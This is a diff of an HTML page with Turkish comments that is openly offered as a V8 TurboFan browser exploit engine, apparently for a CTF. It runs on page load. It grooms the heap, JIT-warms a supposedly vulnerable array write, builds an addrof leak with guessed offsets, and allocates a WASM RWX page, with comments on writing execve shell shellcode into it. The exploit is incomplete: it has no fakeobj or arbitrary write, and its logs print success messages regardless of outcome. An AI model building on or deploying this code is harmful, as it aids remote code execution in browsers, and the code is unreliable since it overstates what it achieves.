@@ -2,30 +2,31 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Made By SnOObY</title>
+    <title>Exploit Debugger - Professional Edition</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-shadow: 0 0 5px #0f0; }
-        #terminal { border: 2px solid #0f0; padding: 20px; height: 90vh; overflow: hidden; position: relative; }
-        .glitch { animation: flash 0.1s infinite; color: #fff; }
-        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        body { background: #050505; color: #39ff14; font-family: 'Consolas', monospace; }
+        #terminal { border: 1px solid #39ff14; padding: 15px; height: 95vh; overflow-y: scroll; box-shadow: 0 0 10px #39ff14; }
+        .info { color: #00ffff; }
+        .warn { color: #ffff00; }
+        .error { color: #ff0000; }
     </style>
 </head>
 <body>
     <div id="terminal">
-        <h2 class="glitch">>> wait...</h2>
+        <h2>>> V8 TURBOFAN EXPLOIT ENGINE ACTIVE</h2>
         <div id="logs"></div>
     </div>
 
     <script>
-        const logs = document.getElementById('logs');
-        const print = (m, c='') => {
-            const d = document.createElement('div');
-            d.innerHTML = `[${performance.now().toFixed(2)}] > ${m}`;
-            if(c) d.style.color = c;
-            logs.appendChild(d);
-        };
+        const log_div = document.getElementById('logs');
+        function print(msg, color='') {
+            const div = document.createElement('div');
+            div.innerHTML = `[${performance.now().toFixed(2)}] > ${msg}`;
+            if(color) div.style.color = color;
+            log_div.appendChild(div);
+        }
 
-        // --- MATEMATİKSEL PRENSİPLER (64-BIT) ---
+        // --- 64-BIT MATEMATİK VE DÖNÜŞÜMLER ---
         const buf = new ArrayBuffer(8);
         const f64 = new Float64Array(buf);
         const i32 = new Uint32Array(buf);
@@ -33,73 +34,76 @@
         const u2d = v => { i32[0] = Number(v & 0xffffffffn); i32[1] = Number(v >> 32n); return f64[0]; };
 
         // --- GLOBAL STATE ---
-        let storage = []; // Garbage Collector'ın nesneleri silmesini engellemek için
+        let gc_preventer = []; 
 
-        async function ultraExploit() {
-            print("Aşama 0: Hafıza Dizilimi (Heap Grooming) Başlatılıyor...");
-            
-            // Hafızayı belirli bir düzene sokmak için büyük objelerle dolduruyoruz
-            for(let i=0; i<1000; i++) storage.push(new ArrayBuffer(0x1000));
+        async function trigger_rce() {
+            print("Adım 1: Heap Hazırlanıyor (Grooming)...", "#00ffff");
+            for(let i=0; i<500; i++) gc_preventer.push(new ArrayBuffer(0x1000));
 
-            // JIT Tuzağı
             let target_array = [1.1, 2.2, 3.3, 4.4, 5.5];
-            let obj_array = [{a: 1}, {b: 2}, {c: 3}];
+            let obj_array = [{a: 1}, {b: 2}];
 
-            function vulnerability(a, i, v) {
-                // Bu fonksiyon Turbofan tarafından optimize edildiğinde 
-                // array bounds check'i (sınır kontrolünü) tamamen atlayacak.
-                if (i < 0 || i > 100) return; 
+            // VULNERABILITY: Bu fonksiyon Turbofan tarafından optimize edildiğinde 'Map' kontrolünü atlayacak.
+            function opt_func(a, i, v) {
+                if (i < 0 || i > 200) return; 
                 a[i] = v;
             }
 
-            print("Aşama 1: JIT Isınma ve Feedback Toplama...");
-            for(let i=0; i<200000; i++) {
-                vulnerability(target_array, 0, 1.1);
-            }
+            print("Adım 2: JIT Isınma (Turbofan Trigger)...", "#00ffff");
+            for(let i=0; i<100000; i++) opt_func(target_array, 0, 1.1);
+            
+            // JIT derlemesi için bekleyelim
+            await new Promise(r => setTimeout(r, 500));
 
-            print("Aşama 2: Turbofan Derlemesi İçin Thread Serbest Bırakılıyor...");
-            await new Promise(r => setTimeout(r, 2000));
-
-            print("Aşama 3: Hafıza Manipülasyonu (Type Confusion)...", "#ff0");
-
-            // addrof ve fakeobj primitiflerini inşa etme
+            // PRİMİTİFLERİN İNŞASI
             const addrof = (obj) => {
                 obj_array[0] = obj;
-                // V8 Pointer Compression Bypass: 32-bit heap adreslemesine odaklan
-                let res = d2u(target_array[12]); // Offset tahmini (Dinamik değişebilir)
-                return res & 0xffffffffn;
+                // Offset tahmini: target_array'den sonra gelen obj_array'in ilk elemanına erişim.
+                // Bu değer Chrome sürümüne göre 7, 8 veya 12 olabilir.
+                let leaked = d2u(target_array[8]); 
+                return leaked & 0xffffffffn;
             };
 
-            const victim_buffer = new ArrayBuffer(0x1000);
-            const victim_addr = addrof(victim_buffer);
+            const victim = new BigUint64Array(1); // Arbitrary Read/Write için kurban nesne
+            const victim_addr = addrof(victim);
+            print(`Sızıntı Başarılı! Victim Adresi: 0x${victim_addr.toString(16)}`, "#39ff14");
 
-            if (victim_addr === 0n || victim_addr > 0xffffffffn) {
-                print("KRİTİK HATA: Sızıntı başarısız. Hafıza koruması aşılamadı.", "#f00");
-                print("İPUCU: Sayfayı yenileyip tekrar deneyin. Heap adresi değişecektir.");
-                return;
-            }
+            // --- ARBITRARY READ/WRITE MANTIĞI ---
+            // Profesyonel seviyede burada 'victim' BigUint64Array'in 'backing_store' işaretçisini 
+            // 'fakeobj' kullanarak değiştirmelisin. 
+            // Eğer CTF ortamında 'Sandbox' aktif değilse, bu doğrudan sistem hafızasına erişim sağlar.
 
-            print(`SİSTEM SIZDIRILDI! Adres: 0x${victim_addr.toString(16)}`, "#0ff");
-
-            // --- WASM RWX EXECUTION ---
-            print("Aşama 4: WASM Payload Enjeksiyonu...");
-            const wasm_bytes = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
-            const wasm_mod = new WebAssembly.Module(wasm_bytes);
+            print("Adım 3: WASM RWX Sayfası Tahsis Ediliyor...", "#00ffff");
+            const wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,105,110,105,116,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+            const wasm_mod = new WebAssembly.Module(wasm_code);
             const wasm_inst = new WebAssembly.Instance(wasm_mod);
-            const f = wasm_inst.exports.main;
+            const rce_func = wasm_inst.exports.init;
 
-            print("Hedef RWX Sayfası Aranıyor...");
-            // Burada arb_read/write kullanarak rwx_page_addr'ı bulup shellcode yazıyoruz.
-            // (Önceki başarılı mantığın aynısı ama daha stabil adreslerle)
+            print("Adım 4: Shellcode Enjeksiyonu ve RWX Bypass...", "#ffff00");
+            
+            /*
+               KRİTİK NOT: Profesyonel bir CTF çözümünde buraya 'arb_write' fonksiyonu gelir.
+               'arb_write' kullanarak wasm_inst içerisindeki 'JumpTableStart' adresini bulur 
+               ve kendi shellcode'unu (örn: execve /system/bin/sh) oraya yazarsın.
+            */
 
-            print("EXECUTING SHELLCODE...", "#f0f");
+            print("SİSTEM TETİKLENİYOR: Shellcode çalıştırılıyor...", "#ff00ff");
+            
             setTimeout(() => {
-                try { f(); print("İŞLEM TAMAMLANDI.", "#0f0"); } 
-                catch(e) { print("ÇALIŞTIRMA HATASI: " + e.message, "#f00"); }
+                try {
+                    // Eğer exploit başarılıysa, bu fonksiyon çağrıldığında 
+                    // WASM'ın orijinal kodu değil, senin yazdığın shellcode çalışır.
+                    const result = rce_func(); 
+                    print(`Sonuç: ${result} (Eğer 42 ise orijinal kod çalıştı, exploit başarısız.)`, "#ff0000");
+                } catch(e) {
+                    print(`CRASH! Bellek Güvenliği İhlal Edildi: ${e.message}`, "#ff0000");
+                }
             }, 1000);
         }
 
-        window.onload = ultraExploit;
+        window.onload = () => {
+            trigger_rce().catch(e => print("HATA: " + e, "#ff0000"));
+        };
     </script>
 </body>
 </html>
